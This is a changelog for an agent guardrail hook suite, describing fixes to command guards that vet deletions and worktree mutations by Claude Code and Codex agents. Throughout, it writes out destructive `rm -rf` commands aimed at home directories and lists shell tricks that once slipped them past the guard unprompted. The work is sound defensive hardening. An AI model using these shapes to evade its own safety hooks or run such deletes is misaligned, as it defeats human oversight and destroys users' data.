- **The subprocess-mutation nudge no longer fires on a file the command creates (cameronsjo/cadence-hooks#377).** `git diff > report.txt` from a primary checkout nudged identically to clobbering a tracked file, and the message asserted "this command mutates tracked files in the primary checkout `<repo>`" — false for a brand-new scratch file, and naming only the repo rather than the path it had resolved. That combination is why the report reads as a wrong-cwd bug: with no path in the message there was no way to see what the walk had picked. The stated root cause is refuted — `enforce_worktree` resolves solely from the payload `cwd` and reads no session state, no parent-session state, and no process cwd. A `MutationTarget::File` whose path does not exist is now skipped before the `.parent()` ascent, via a plain `symlink_metadata` probe with no git spawn (the #271 probe discipline — `symlink_metadata` rather than `exists` so a tracked-but-dangling symlink still nudges). Mutations of existing files still nudge, and `MutationTarget::Dir` (a package-manager verb's cwd) is untouched. The gate cannot distinguish a scratch `report.txt` from a brand-new *source* file, since both are equally absent at hook time, so a first write of `src/newmod/lib.rs` into the primary is now silent too; that widened miss is enumerated in the module header rather than left implicit. The message now names the resolved path — routed through the shared display sanitizer, so a filename carrying newlines cannot forge extra lines in the guard's own advisory — and drops the "tracked" claim, which the walk never verified. Two existing tests asserted a nudge on a path their fixture never created — the fixtures were corrected to match what the test names describe, not the assertions weakened.
- **guard-rm stopped approving two shapes of protected delete** (cameronsjo/cadence-hooks#426, #427). Both were silent ALLOWs on `main` — not prompts, not blocks — and both are verified by a differential against a binary built from `origin/main`, with every kill switch unset and a known-BLOCK control leading each batch.

  **A transparent prefix carrying a flag no longer reads as "not a deletion" (#426).** `skip_transparent_prefixes` only skips a prefix when the *next* token is not an option, so `env -i rm -rf ~/Documents` left `env` as the leading word, matched no delete verb, collected no targets — and an empty target list meant "not a deletion". The segment is now **unresolvable**, which asks rather than approves. `eval` joins the same gate, an explicit row in that issue's table that was in neither prefix set.

  Fixed guard-rm-locally rather than in the shared primitive: that one is also `enforce_worktree`'s and carries its own review history, where the same clause is a documented miss whose cost is only a missed commit block. Unresolvable rather than a re-parse because each prefix has its own flag grammar — `env -u` and `nice -n` take a value, `env -i` does not — and guessing wrong would skip past the delete verb itself. Gated on a delete verb actually appearing, so `env -i ls` stays silent. The gate keys on a literal delete-verb *token*, which a deletion need not carry (`env -i find … -delete`, `env -i sh -c "rm …"`); those are pre-existing and filed as #443.

  **A `..` behind a glob metachar no longer escapes the parent-segment check (#427).** `glob_literal_prefix` truncates the operand at the first `*`/`?`/`[`, and the check read only that truncated prefix — so `rm -rf /private/tmp/*/../../..`, which every match expands to `/`, classified as a clean glob under `/private/tmp` and was approved. The check now runs against the whole operand before any reduction, the same reasoning as the brace guard three lines above it.

  **#428 was attempted and withdrawn.** Widening directory tracking past the literal `cd` — to `\cd`, `FOO=1 cd`, `command cd`, `pushd`/`popd` — was built three different ways across five adversarial review passes, and each one turned a BLOCK into a silent ALLOW. The fifth pass named the generator rather than another instance: *widening what a model resolves inherits every inaccuracy the model already had.* `main` blocks `\cd /tmp; rm -rf Documents` from `$HOME` precisely **because** it does not model that spelling — it retains the real directory. Making the spelling resolve handed it every pre-existing hole in the `cd` resolver: subshells, pipelines, background, `&&` short-circuit, extra operands, unknown flags. Seven shapes, three shells, each a `main` BLOCK turned ALLOW.

  Two further findings are recorded on the issue for whoever picks it up: the shell-semantics matrix (`command cd` stays under zsh and moves under bash; `pushd <dir> -n` stays under zsh and bash 5 and moves under bash 3.2; `pushd <old> <new>` is a name substitution, an error, and a move respectively), and the fact that the naive fix makes things *worse* rather than merely incomplete. Nothing in this release changes #428's behavior.

- **The polish ship anchor now requires `gh` to be the segment's command word** (cameronsjo/cadence-hooks#419). `is_polish_ship_anchor` matched a `gh pr create`/`gh pr ready` *anywhere* in a segment's token stream, so a `gh` sitting in argument position — a word the shell hands to some other program — read as an invocation. `git commit -m "$(echo gh pr create)"` fired the gate: `expand_segments` extracts `$(…)` bodies in executed context and double quotes do not suppress expansion, so the commit contributes a segment tokenizing as `[echo, gh, pr, create]`. Under the previous `split_segments`, the `-m` argument collapsed to one token and correctly rejected; PR #414's move to `command_segments` is what made the shape reachable.

  Cost was a spurious nudge on an ordinary commit **plus an inflated `log-polish-nudge` denominator** — and that ledger is the polish gate's own efficacy measurement (#409), so the noise landed directly in the numbers used to judge whether the gate is worth keeping.

  Anchoring at index 0 keeps every ordinary ship: `sh -c 'gh pr create'` matches because the wrapper expands and the inner segment leads with `gh`; `exec gh pr create` and `FOO=1 gh pr ready` match because the transparent prefix is skipped; `{ gh pr create; }` matches because group wrappers are stripped first; `gh --repo owner/r pr create` matches because the global-flag walk is unchanged. It also retires the positional scan's quadratic hazard outright — one walk per segment instead of one per `gh` token, so the `gh --repo` flood is linear by construction rather than by the resume bookkeeping it previously needed.

  **Four families are missed by construction, and the doc comment now enumerates all four** rather than naming only the first: a transparent prefix carrying its own flag (`env -i`, `nice -n`); a prefix outside `TRANSPARENT` (`sudo`, `timeout`, `xargs`, `stdbuf`, `eval`); a shell keyword in command position (`if ! gh pr create; then …`, `for … do gh pr create; done`); and a path-qualified command word (`/opt/homebrew/bin/gh pr create`), which is pre-existing — the positional scan compared against the literal token `gh` too. Every one is nudge-only, so each costs an un-nudged ship and never a wrong block — but each also *shrinks* the `log-polish-nudge` denominator, the opposite error from the inflation being fixed, which is why they are pinned by test as known misses rather than left implicit. Catching the second family would mean widening `TRANSPARENT`, which `enforce_worktree` and `guard_rm` share; a nudge is not worth buying a change to a block-capable gate's model of what runs a command.

  `strip_group_wrappers`, `TRANSPARENT`, and `skip_transparent_prefixes` moved from `guardrails::enforce_worktree` to `core::shell` to make this possible — core is the only crate both the guards and the anchor can reach. That gives `enforce_worktree`, `guard_rm`, and the anchor one shared set; it is explicitly **not** the repo's only prefix set, and the doc comment now names the three others that answer adjacent questions with deliberately different membership — `warn_alias_parsing::WRAPPERS`, `prevent_secret_writes::COMMAND_WRAPPERS` (a blocking check), and `doctor`'s stale-wiring scan. `sudo` and `xargs` are transparent to some of those and deliberately absent here, which is the whole reason unification would be a widening rather than a cleanup. Guard behavior is unchanged: the move is byte-identical logic under a new path, verified by a differential against a binary built from `origin/main` across guard-rm's 45 probe cases and enforce-worktree's 12, all identical.

  **Including `strip_group_wrappers` in that move does two jobs, and the second is the one worth naming.** Spelling decides which: `tokenize` fuses grouping punctuation to the *adjacent* word, so unspaced `(gh` is one token while spaced `( gh` is two. Measured against `origin/main`, `(gh pr create)` and `{gh pr create --fill;}` were silently missed and now anchor — but `( gh pr create )` and `{ gh pr create; }` already *were* anchors, because the positional scan found `gh` at index 1. Under an index-0 gate those see `(` as the command word, so without the strip this change would have taken two working anchors away. Fixing a pre-existing miss is the visible half; not regressing the spellings that worked is the half that would have gone unnoticed. The guards have stripped groups since #239 F4 for exactly this reason; the anchor never did.

  **Not fixed here:** the anchor and the resolver still disagree about *where* a wrapped ship happens. `parse_work_dir` is a raw-string scan that does not descend into `sh -c '…'`, so `sh -c 'cd /other/worktree && gh pr create'` is detected as a ship but judged against the unchanged starting cwd. That needs the resolver to descend into wrappers — a much larger change to a primitive several block-capable guards consume — and is tracked as cameronsjo/cadence-hooks#448.

- **`record-polish --repo-root` no longer writes a marker the ship gate cannot read** (cameronsjo/cadence-hooks#417). The flag's value was used **verbatim** as the marker key while the default path resolved through the canonicalized `git_common_dir`, so the two disagreed and the flag was the one that lost. The natural value to pass is the linked worktree you are standing in, and that is exactly the value that broke: recorded from one worktree, the marker keyed on the worktree's own path, and `nudge-polish-before-pr` — keyed on the common dir — could never find it.

  The failure was silent and delayed. `record-polish` printed a success verdict naming a plausible path, and the cost landed later as a polish nudge on a branch that genuinely had been polished, which reads as the gate being broken rather than the record being mis-keyed. This is the *actual* writer/reader divergence #394 and #368 hypothesized — their diagnosis was refuted for the default path, where both sides have keyed on `git_common_dir` since 0.60.0, but it was real on the flag path, and anything scripting `record-polish` with an explicit root (an orchestrator recording on a worker's behalf) hit it.

  An explicit `--repo-root` is now resolved through the same canonicalization, so the flag can only ever *locate* the repo, never *redefine* the key — a worktree path, its primary checkout, and no flag at all all produce one key. When the path resolves to no repository the literal value stands, which keeps the test override (a bogus dir plus an explicit branch, resolving without touching git) working — the affordance the flag existed for in the first place — and that fallback now prints one stderr line naming what it did, because a success verdict over a key nothing will read is the exact failure this issue exists to kill.

  **The flag re-bases the whole resolution, not just the repo half.** `branch` and `head_sha` are read from the same checkout the root names, rather than from the caller's cwd. Splitting them was inert before this fix — an explicit root produced a key nothing read — and would have become live with it: an orchestrator recording on a worker's behalf (`record-polish --repo-root <worker worktree>`, no `--branch`, run from a checkout sitting on `main`) would have written a marker keyed to the worker's repo but the *orchestrator's* branch, silently crediting `main` with a polish it never had while the branch that was actually polished kept getting nudged. That is precisely the case the flag exists for, so closing the repo half alone would have traded a dead marker for a wrong one.

  `--repo-root`, `--branch`, and `--scope` also gained `--help` descriptions; all three previously rendered with none.

## [0.68.0] - 2026-07-25

### Added

- **`warn-stale` gains a per-stream flatline verdict** (cameronsjo/cadence-hooks#217). Freshness was measured at *directory* grain — the newest `*.jsonl` in the metrics dir defined the whole dir's health — so one live stream masked every dead sibling. The proven failure the alarm exists for would not have fired it: `commits.jsonl` was dead five weeks while `sessions.jsonl` wrote the entire time (cameronsjo/cadence#146), and the dir never looked stale for a moment. Alongside the existing whole-subsystem **Stale**, a **Flatline** verdict now fires when something wrote recently but a named *continuous* stream stopped anyway, and it names both the dead stream and the live one masking it — that contrast is the finding, since without it a reader cannot tell a dead collector from a quiet week. Stale deliberately subsumes Flatline: when nothing has written recently, enumerating dead streams on top of a louder signal is noise.

  **The noise floor is the design work, not the detection.** Only streams whose silence means *breakage* can accuse: `sessions`, `commits`, `subagents`, `skills`. The event-sparse streams are excluded by name — `denials`, `bypasses`, `sweeps`, `askuserquestion`, `failopen`, and the threshold-gated `hooks.jsonl` — because silence there is *good news*, and nagging about a quiet week is exactly how an operator learns to dismiss the nudge that matters.

  `insights.jsonl` is watched but **barred from accusing**, for that same reason: `capture-insights.sh` fast-rejects before it touches the file when a session emitted no capture marker, so a stretch with no captures freezes the mtime with nothing broken. A real ledger carried two 18-day quiet runs while the subsystem was demonstrably live — under the 4-day default each would have produced roughly a fortnight of consecutive daily "hooks may be mis-wired" nudges. It still counts toward Stale and can serve as liveness proof. `sessions/scorecard.jsonl` is deliberately unwatched despite being named in the issue: it is derived by a meta-repo script rather than any hook, so this check's remediation would send the operator down a false trail.

  The once-per-day marker now carries the **verdict**, not just the date, so a collector that dies at 10am is reported at 10am instead of waiting for tomorrow; ages are excluded from the token, so a stream merely aging 5d → 6d does not re-nag. Ledger basenames are sanitized and length-bounded at capture — a filename is attacker-influenceable (a project `settings.json` `env` block can point `CADENCE_METRICS_DIR` at content the operator did not author) and this one flows into the `additionalContext` a nudge injects into the agent's own context, where an unsanitized newline starts what reads as a new instruction.

- **`doctor` flags a hook-shipping plugin that is installed but not enabled** (cameronsjo/cadence-hooks#397). `warn-stale` cannot detect the one failure it most exists to catch — a whole-plugin disable — because it is wired *inside* the metrics plugin, so disabling that plugin takes the canary down with the subsystem it watches. Observed cost: a metrics subsystem dark for one to two months on a live machine with no alarm. Per-stream freshness is necessary but not sufficient, so the canary moves to `doctor`, which is the binary and stays up when any plugin is down. **Absent, not `false`:** an explicit `false` is a deliberate choice and stays silent; a missing key is the actual fingerprint. A missing, unparseable, *or empty* `enabledPlugins` means *cannot judge*, never *all broken* — an empty map would warn about every installed plugin at once. `settings.local.json` overrides `settings.json`, matching Claude Code's own precedence.
- **guard-rm stops prompting on a single-file delete.** Without `-r`, `rm` and `unlink` cannot remove a directory — the shell refuses — so a glob-free operand names exactly one file. That is a shell guarantee, not a filesystem probe, and it costs no I/O, which is what distinguishes it from the recoverability classifier this replaced.
  It softens **only** the ambiguous middle. `rm build.log` and `rm src/main.rs` go silent; `~/.zshrc`, anything in the vault, any `.git` path, `$HOME`, and `/` all still block.
  **`PathClass::ClaudeState` exists because of this softening.** Durable `.claude` state — session transcripts, the metrics audit trail, skills, rules, hooks, agents, plugins, both memory trees — previously landed in the same residual bucket as an ordinary project path. Softening the residual would therefore have silently re-opened the subtree the scratch allowlist just closed, since `rm ~/.claude/projects/<session>.jsonl` is exactly one file. Splitting it into its own class keeps it asking. It sits below the structural classes, so `~/.claude/.git` still reports git-root and `~/.claude` itself still reports home-child — but **above `DocsPlans`**, which has no guard-rm arm and therefore reads as the ambiguous middle: with the order reversed, `~/.claude/docs/plans/x.md` rode the softening to silence, defeating this class for exactly the subtree it was added to protect.
  Three exclusions keep the class's premise true, each one a verified silent ALLOW during review. **`rm -d`/`--dir` leaves the class** — it removes an empty directory without `-r`, the one flag that falsifies the premise. **A glob-bearing operand leaves it** — `rm *` resolves to the *directory* the sweep runs in, not one file. **A brace-bearing operand is unresolvable outright**: `rm -f ~/{Documents/notes,.zshrc}` is one token naming many targets, and `strip_group_wrappers` trims the trailing `}` so it arrives as a single glob-free path whose first alternative escapes its protected class — the softening then made it silent while bash deleted both entries.
  Independently, **an unfollowable `cd` now makes relative targets unresolvable** rather than carrying the stale directory's verdict. `cd $UNKNOWN; rm -rf Documents` from a temp cwd used to judge `Documents` against the directory the shell had already left. A `~`-anchored target is exempt — it resolves to home wherever the shell stands, so withholding it would only lose a BLOCK.
  **Same-command variable expansion was built for this release and withdrawn.** `SP=/tmp/x; rm -rf "$SP"` still asks. Three adversarial review rounds found sixteen silent-ALLOW misses in it; the third round found four *categorically* new routes rather than variations — `printf -v` re-binding through argument position, a transparent prefix defeating the variable-mutating-builtin gate, `IFS` redefining what a separator is, and subshell scoping erased by `strip_group_wrappers`. The gate was also shown to create a new evasion of an existing hard block: appending `; unset FOO` downgraded a `$HOME` BLOCK to an approvable prompt. The shell moves a variable through more routes than a parser at this altitude can enumerate, and each round of enumeration found the next one. Nothing regressed by withdrawing it — every affected shape returns to the verdict it has today.
  **Not fixed here, filed instead**, all three present before this change and each requiring a primitive shared with `enforce_worktree`: a transparent prefix carrying a flag collects zero targets and reads as "not a deletion" (`env -i rm -rf ~/Documents` allows — cameronsjo/cadence-hooks#426); a `..` behind a glob metachar escapes the parent-segment check (`rm -rf /private/tmp/*/../../..` allows — #427); and `cd` tracking misses `command cd`, `builtin cd`, `\cd`, a prefix-assigned `cd`, and `pushd` (#428).

- **`session persist-plan-approval` fires plan persistence on same-session `ExitPlanMode` approval, not just the approve-and-clear wipe (cameronsjo/cadence-hooks#396).** The existing `persist-plan` UserPromptSubmit trigger only ever saw the harness's re-injected `Implement the following plan:` prompt — a plan approved without leaving the session (no `/clear`, no injected prompt) left no durable trace. A live probe confirmed `PostToolUse:ExitPlanMode` fires on that path and carries the plan text in `tool_response.plan` (`tool_input.plan` is empty there). Both triggers now share one persist core and emit frontmatter (`status: in-flight`, `body_sha256`, `approved_in`/`approved_session_id`, ...) in place of the old plain-text provenance trailer; idempotency anchors on the parsed `body_sha256` frontmatter key, so a plan body that grows after persist (ticked checkboxes, appended `## Deviations`/`## Learnings`) is still recognized as the same plan on a re-fire. Closes #396.

- **`session start` now discloses in-flight/blocked plans from `docs/plans/*.md` frontmatter (cameronsjo/cadence-hooks#429).** A resuming session (an auth-swap restart, `/clear`) had no memory of what plan was open — this reads it back from the plan's own frontmatter (`status`/`next`/`branch`/`pr`) at `SessionStart`, with no GitHub call. Reuses `persist-plan`'s existing bounded frontmatter scan (`leading_frontmatter_block`) rather than a new YAML dependency or a second scan implementation, and extends the existing `session start` disclosure — joined alongside the worktree-posture line and peer disclosure — rather than adding an 8th SessionStart hook row. Opt-out by absence: a plan with no frontmatter, or frontmatter carrying no `status:` key (every plan predating #396, and the 2026-07-24 retrofit batch that only added provenance keys), is silently skipped; this never bulk-adopts the legacy corpus.

### Changed

- **`doctor`'s `version_mismatch` finding names the invocations, not just a count** (cameronsjo/cadence-hooks#183). The stale-binary breadcrumb the issue asked for already ships — the plugin wrapper's `notify_inert` names the missing subcommand once per day — but `doctor` knew only that *a* skew existed, leaving the operator to audit every installed plugin by hand. The finding now names the distinct `namespace subcommand` pairs behind it (deduped, sorted, capped at four, bounded per half) and renders a runnable `grep -rlF -e … -e …` over the **resolved** plugin cache, honoring `CLAUDE_CONFIG_DIR` rather than assuming `~/.claude` — a remediation that greps the wrong tree returns zero hits and reads as "no stale wiring". Naming them immediately paid off on a real machine: a 96-row skew that read as an unresolved production problem turned out to be this repo's own integration-test fixture names, historical residue in the live ledger.
- **Nudge-fire telemetry is ON by default** (cameronsjo/cadence-hooks#420). `log_denial` now writes a `decision: "nudge"` row to `denials.jsonl` for every `Nudge`/`LoopBlock` outcome unless `CADENCE_LOG_NUDGES` explicitly opts out (`0` / `false` / `off`, case-insensitive, or set-but-empty — the old semantics' OFF state, preserved as a value-free kill switch); unset — the common case — means on, and the legacy opt-in `1` keeps working unchanged. Rationale: nudge-fire rates are the denominator for every adherence measurement, and the 2026-07-25 third-pass adherence review found the dark-by-default layer had left every nudge-tier verdict unverifiable for the subsystem's entire life. `Block`/`Ask` logging and the Allow hot path are untouched; rows are privacy-safe by the existing construction (guard + tool + repo, never content).
- **Codex CLI is now a first-class hook and metrics harness.** `cadence-hooks
  manifest --format json` exposes the binary registry for compatibility audits;
  Codex shell, unified-exec, patch, MCP, subagent, and lifecycle inputs normalize
  into the shared hook model; multi-target decisions use the strictest outcome;
  and security-critical Codex parse failures deny without persisting raw input.
  A generated compatibility report joins the registry, plugin matchers, route
  coverage, and paired Claude/Codex fixtures. Metrics schema v2 preserves harness
  provenance, reads legacy Claude ledgers without duplication, scans supported
  Codex rollout metadata without transcript content, and keeps Codex pricing
  nullable and explicitly estimated.

### Fixed

- **Codex harness detection is now one case-insensitive check instead of three call sites with two different rules.** `CADENCE_HARNESS` was read independently in `emit_and_exit` (core), `codex_fail_closed` (dispatch), and `harness()` (metrics); the first two compared case-sensitively and the third did not. A value like `CADENCE_HARNESS=Codex` therefore tagged the ledger row `codex` while both security paths — the fail-closed parse denial and the `Ask` → `Block` conversion, the two behaviours that exist to stop Codex failing open — silently treated the run as Claude. The divergence failed **open** at precisely the moment the metrics claimed Codex was driving. All three now call `cadence_hooks_core::is_codex_harness`, whose pure resolver `is_codex_harness_value` is unit-tested against mixed casings and the empty/unset cases; unset, empty, and lowercase behaviour is unchanged, so the only shift is that non-lowercase values are now recognised — strictly toward fail-closed.

- **`tests/codex_coverage.rs` no longer writes telemetry into the operator's real metrics directory.** Both spawn sites ran the built binary without pinning `CADENCE_METRICS_DIR`, so `metrics_dir()` resolved to the live ledger and running the suite appended production-shaped rows to it. Every other integration test in the directory already pins it; these two now do too, via an `isolated_cadence_hooks` helper.

- **`tests/selective_disable.rs` and `tests/session_markers.rs` stop leaking into the live ledger too**, closing the follow-up named in the 0.68.0 entry for `tests/version_mismatch.rs`. Both funnel every spawn through one helper, so each needed a single `CADENCE_METRICS_DIR` pin — `selective_disable` to a process-lifetime scratch dir, `session_markers` to a subdirectory of the temp marker dir it already sandboxes. Measured rather than assumed: a full `cargo test --workspace` now leaves the real `denials.jsonl` line count unchanged, where it previously grew.

- **The metrics root default stays at `<config_dir>/metrics`.** A cross-runtime schema change had also relocated it to `~/.local/state/cadence/metrics` behind new `CADENCE_STATE_HOME`/`XDG_STATE_HOME` tiers. That is a migration, not a schema bump, and it shipped without one: a read-only legacy fallback reached only two call sites — both reading `commits.jsonl` — against roughly twenty that resolve `metrics_dir()` directly, so on the first upgrade ten of twelve live streams (`denials`, `subagents`, `bypasses`, `failopen`, `sweeps`, `skills`, `askuserquestion`, `polish_nudges`, `hooks`, `plan-links`) would have gone silently invisible to `doctor`, `warn-stale`, and every analysis path, with no step copying the existing data forward. The relocation is reverted here and belongs in its own change with a migration. Schema v2's genuinely cross-runtime parts — the `harness` and `sourceFormat` fields, the Codex rollout scanner — are unaffected.

- **guard-rm's `.claude` ALLOW became an allowlist of session scratch, and two unreadable delete shapes stopped judging as ALLOW.** The carve-out granted the silent-ALLOW class to *any* path with a `.claude` component and something after it, which reads as "Claude's own scratch directory" and is false: `~/.claude` holds about forty entries and a repo's `.claude` a dozen more, nearly all durable and none of it git-tracked. Probing the shipped binary confirmed silent ALLOW on `rm -rf ~/.claude/projects` (every session transcript), `~/.claude/metrics` (the audit trail these guards write), `~/.claude/plugins`, `~/.claude/agent-memory` and its per-repo twin, and — because the carve-out outranks the git-root rule by design — `~/.claude/.git`, whose deletion is a real step in the chezmoi migration and which the guard would otherwise BLOCK. `pathclass::CLAUDE_SCRATCH_DIRS` now names the two subdirectories that are genuinely regenerable, `worktrees` and `intros`, and a path earns `PathClass::ClaudeScratch` only strictly *under* one of them. A directory nobody has vetted now costs a prompt instead of a silent delete, and the scratch dirs themselves are excluded alongside `.claude` itself: `.claude/worktrees` is every worktree at once, uncommitted work included, which is not the one-disposable-thing case the ALLOW exists for.

  The rename from `ClaudeManaged` is not cosmetic — the old name described the tree, and the class now describes a slice of it. **#35's carve-out is not re-opened by the memory tree leaving this class.** That incident's live consumer is `warn-main-branch`, which reads `worktree::is_claude_managed_dir` (the coarse `.claude`-anywhere match, unchanged and separately tested); `pathclass` has exactly one consumer, `guard_rm`, and for a *delete* the correct fact about an untracked memory tree is "not proven disposable". The seed test now locks that, and says where the original fact still lives.

  Two shapes that reached no target at all judged as ALLOW through the same door — an empty target list meant "not a deletion, not ours". A **recursive** `rm` with no readable operand is now one `Unresolvable` (ASK): it deletes something, by a route this parser cannot see. `rm --help` and a bare non-recursive `rm -f` carry no recursion flag and still allow. And **`… | xargs rm -rf`** asks, where before the leading word was `xargs`, no delete verb was found, and a recursive delete of whatever the upstream stage produced was approved silently. The `xargs` predicate is deliberately coarse — any token whose basename is a delete verb, rather than parsing xargs's option grammar to locate the command word. The precise version has a real miss (`xargs --max-args 3 rm -rf` leaves the option's value exactly where the command word is expected), a miss here is a silent recursive delete, and every outcome of this predicate feeds an ASK rather than an ALLOW, so over-matching cannot open a hole in either direction.

  **Strictly tightening: no path that prompted or blocked before now allows.** The `Bash(*rm*)` prefilter in `cadence-guardrails`' `hooks.json` already admits every affected command, so no wiring change ships with this.

- **The two `doctor` default-scan integration tests now scan the fixture they build instead of the developer's live machine** (cameronsjo/cadence-hooks#347). Both failed on any machine with plugins installed, so `cargo test --workspace` carried two permanent failures that masked real regressions. The issue attributed this to the doctor binary ignoring the tests' `HOME` override; it does not. `plugins_dir()` *prefers* `<CLAUDE_CONFIG_DIR>/plugins` and only falls back to `$HOME/.claude/plugins` when that path is absent — so an ambient, absolute `CLAUDE_CONFIG_DIR` (the normal state on a working machine) made the `HOME` override irrelevant and pointed the scan at 45 live plugins. The fixture's buggy `hooks.json` was never read, so no `Severity::Error` was ever emitted and the live cache's warnings produced exit 1 where the tests assert 2 — a count of errors, not of plugins. Two sibling tests already removed the variable and always passed; a `doctor_in_home` helper now makes that the single pattern for all four, pinning `CADENCE_METRICS_DIR` alongside it since the metrics default resolves through the same config dir. Assertions and fixtures are unchanged — the behaviors under test were correct all along, merely never exercised.
- **`persist-plan`'s idempotency check can now recognize a plan it did not write, so a backfilled plan stops being a permanent `-2` trigger** (cameronsjo/cadence-hooks#399). The check read only the `Plan-body-SHA256:` provenance line this hook appends, so any plan document reconstructed by other means — frontmatter, no provenance block — could never match, and every re-approval of that plan laddered to a fresh `-<n>.md` sibling forever. Measured against `claude-configurations/docs/plans`: 238 documents, only 2 carrying a provenance line, 76 carrying backfill `source_plan:` frontmatter — all 76 permanently laddering. `file_body_hash` becomes `file_matches_body`, which answers from two sources in one capped read: the last provenance line when present (authoritative, preserving the last-occurrence anti-decoy anchor), otherwise a recompute — strip leading frontmatter, strip the trailing harness suffix lines, hash — matching the way the live path computes the body in the first place. That recompute recognized 75 of the 76 backfilled plans; the one holdout is a genuinely reworded plan and correctly keeps laddering. The conversion is one-way by construction: only an equality returns a match, so a document that previously read as "no marker, no match" may now match, and one that already matched can never stop — with one boundary case worth stating rather than letting the invariant read broader than it is, since the old reader was uncapped: a provenance-carrying file that later grew past the new 1 MiB cap would flip to no-match and ladder. Nothing reaches it — this hook writes a plan exactly once through `create_new` and never appends, and the measured corpus tops out near 37 KiB — and the failure mode is a laddered sibling, not a lost document. Frontmatter stripping engages only on a first line of exactly `---` with a closing fence within 100 lines, so a body opening with a thematic break is left untouched — at worst a mismatch, which ladders, never a false match. The read is now capped at 1 MiB (it was unbounded), and the `Plan-body-SHA256:` label became a shared constant across the writer and the reader: with a recompute fallback in place, a label drift between the two would no longer be a visible no-match but a silent reclassification of every document this hook wrote as one it didn't.
- **Every `catch_unwind` in the binary was dead code, and now none of them are (cameronsjo/cadence-hooks#349).** The global panic hook in `src/main.rs` ended in `process::exit(1)`. A panic hook runs *before* unwinding begins, so that exit terminated the process and no downstream `catch_unwind` ever regained control — the Logger guard in `src/dispatch.rs`, the one in `cadence_hooks_core::run_logger_from_stdin`, and `persist-plan`'s own narrow guard were all unreachable in the shipped binary. The reported symptom (the `Check` path lacks the guard the `Logger` path has) was real but its suggested fix would have added a fourth piece of dead code; the actual fix makes the existing guards reachable. A `PANIC_GUARDED` flag, set by dispatch around the region its `catch_unwind` covers, tells the panic hook to *return* instead of exiting — but only on the main thread, since a panic on a spawned worker (the stdout drain in `core::shell::run_bounded_with`, inside the guarded region) unwinds that thread and nothing is positioned to catch it. Panics outside a guarded region keep the historical exit-1 path byte for byte.

  **Behavior change: a caught Check panic now completes its telemetry tail instead of aborting dispatch.** Previously a panicking check skipped `log_denial`, `log_bypass`, the `deadline` degradation rows, and `log_timing` outright — the telemetry that says a guard ran at all. **The exit code is deliberately unchanged at 1.** `Outcome::code` maps every non-`Block` outcome to 0 and only `Block` to 2, so neither 0 nor 1 ever blocked and failing open here does not require 0; what 1 buys is detectability. Claude Code surfaces a hook's stderr on a non-zero, non-2 exit and discards it on 0, so at exit 0 a check panicking on *every* invocation — total enforcement failure for a block-capable guard like `guard-gh-write` — would be indistinguishable in real time from one that works, with the panic breadcrumb written to stderr and thrown away and the only record a `failopen.jsonl` row nobody reads until they run `doctor`. That is a detectability regression, not a fail-open improvement. The **logger** path is the exception and keeps exit 0: `run_logged_logger` documents an always-exit-0 contract, which this makes true for the first time (a panicking logger used to exit 1), and a logger enforces nothing.

  The duplicate `log_failopen("panic", …)` in the logger arm is gone: the panic hook writes that row with strictly better data (the payload and source location, which the dispatch site never had). One row per panic, either way. The flag is set through an RAII guard whose `Drop` clears it — correct here precisely because `Drop` runs during the unwind, so the normal and panicking paths clear it through the same line.

- **`failopen.jsonl` records now carry the error that caused them (`schemaVersion` 1 → 2).** `doctor` told operators to "inspect failopen.jsonl" against a record shape — `binaryVersion / namespace / reason / schemaVersion / subcommand / ts` — that could not answer why anything failed (cameronsjo/cadence-hooks#398). Every degradation site already held a diagnostic and dropped it on the floor; each now passes it through: the parser's own message on both stdin-parse paths, the panic payload plus its `file:line` in the global hook, and the clap error *kind* (`"InvalidSubcommand"`, not the multi-line ANSI-colored error) on version skew. The deadline rows pass `None` — a timeout has no message beyond its reason. **v1 rows stay readable with no migration**: readers reach the field through `Value::get`, so an absent `error`, an explicit null, and a non-string all collapse to "no diagnostic here". The no-payload privacy posture is unchanged — sites pass only this binary's own generated text, never the offending stdin. Values are truncated to 200 characters *on write*, on a character boundary rather than a byte offset, and stripped of both C0/C1 control characters **and** Unicode Cf format characters — U+202E RIGHT-TO-LEFT OVERRIDE and the U+2066–U+2069 directional isolates are the Trojan-Source primitives, and `char::is_control` passes every one of them, so a stored error could otherwise reorder the rendered `doctor` line it lands in.
- **`tests/hook_registration_audit.rs` audited the pre-monorepo plugin layout, so every cross-repo assertion either passed vacuously or failed en masse.** `BINARY_PLUGIN_DIRS` built `<workspace-root>/<plugin>/hooks/hooks.json` paths; since the 2026-06-28 consolidation the manifests live one `plugins/` segment deeper, inside the single `cadence` monorepo checkout. Which failure mode you got depended entirely on local accident: zero directories resolving made the map empty and the old guard skipped all five gated tests green, while *one* surviving pre-consolidation checkout (`cadence-metrics`) made it non-empty, so the tests ran and reported every subcommand in the other five namespaces as unregistered — ~60 false findings from one leftover directory. Five changes, none of which alter what the audit asserts, only where it looks and when it trusts the answer. (1) A two-layout resolver tries the monorepo path **first** and the legacy path second; the ordering is load-bearing, since a surviving standalone checkout is frozen at its split-off commit and would otherwise shadow the canonical manifest with a manifest missing every hook added since. (2) The skip is now **all-or-none** and loud — it lists what resolved, what didn't, and both paths tried for each — because post-consolidation all five manifests live in one checkout, so a partial resolve is a broken environment rather than a finding. (3) `workspace_root()` resolves through git's *common* dir, so the audit finds the real siblings when run from a linked worktree instead of silently skipping; `CADENCE_AUDIT_WORKSPACE_ROOT` overrides it and `CARGO_MANIFEST_DIR`'s parent remains the fallback for CI and tarball builds. (4) The `PENDING_PLUGIN_GROUPS` directory probe goes through the same resolver — the identical frozen assumption in a second place, inert only because the const is empty. (5) Because the audit reads a developer's *working tree* rather than a pinned artifact, every assertion's failure message now says so and names the `git status` that distinguishes a stale sibling from real drift. Closes #350, closes #400.
- **`all_binary_subcommands_are_registered` derives the hook set from `cadence-hooks list` instead of a hand-maintained exclusion const.** `NON_HOOK_BINARY_SUBCOMMANDS` was a third copy of knowledge `src/main.rs` already encodes structurally — `hook_name()` returns `None` for every CLI action — and it had already drifted, missing `cadence record-polish` and `guardrails dismiss-enforce-worktree`, which would have surfaced as two phantom unregistered hooks the moment the audit started biting again. `list` renders `registry.rs::HOOKS`, the declared single source of truth, and excludes CLI actions by construction (64 hooks against 69 subcommands from `--help`; the 5-entry delta is exactly `record-polish`, `dismiss-main-branch-warn`, `dismiss-enforce-worktree`, `declare`, `status`). `binary_subcommands()` is kept for `all_registered_hooks_exist_in_binary`, which asks whether a dispatch names a real subcommand at all and so correctly spans the full CLI surface. The const is deleted rather than patched — patching it would re-arm the same trap for the next CLI action.
